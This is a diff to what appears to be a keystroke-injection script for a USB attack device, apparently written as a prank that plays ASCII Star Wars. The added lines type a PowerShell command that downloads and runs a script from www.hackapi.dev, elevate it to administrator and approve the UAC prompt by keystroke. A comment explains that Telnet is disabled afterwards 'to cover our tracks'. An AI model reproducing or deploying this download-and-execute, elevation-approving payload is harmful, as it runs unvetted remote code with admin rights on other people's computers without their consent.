@@ -37,15 +37,24 @@ END_EXTENSION
 REM Open Run Dialog
 GUI r
 DELAY 200
-REM Enable Telnet
-STRING powershell Enable-WindowsOptionalFeature -Online -FeatureName TelnetClient;
-REM Use Telnet for Star Wars
-STRING telnet towel.blinkenlights.nl
-REM STRING powershell iex (iwr "www.hackapi.dev/api/starwars").Content
-DELAY 200
-REM Run as Admin
+REM Execute a fetched PS one-liner
+STRING powershell iex (iwr "www.hackapi.dev/api/starwars").Content
+REM_BLOCK
+  iex: Invoke-Expression
+  iwr: Invoke-WebRequest
+  www.hackapi.dev/api/starwars: a URL that returns a PS one-liner
+  .Content: The actual content of the fetch, namely the PS
+  PS (written as several lines for clarity): 
+    $TelnetStartedDisabled = ((Get-WindowsOptionalFeature -Online -FeatureName TelnetClient).State -ne "Enabled");
+    if ($TelnetStartedDisabled) { Enable-WindowsOptionalFeature -Online -FeatureName TelnetClient };
+    telnet towel.blinkenlights.nl;
+    if ($TelnetStartedDisabled) { Disable-WindowsOptionalFeature -Online -FeatureName TelnetClient }
+  Description: Plays ASCII Star Wars using Telnet. If Telnet is Disabled, it
+    will Enable it. When complete, it will Disable Telnet if it started
+    Disabled, in order to cover our tracks. 
+END_REM
 CTRL-SHIFT ENTER
-DELAY 400
+DELAY 250
 REM Approve Admin dialog
 ALT y
 
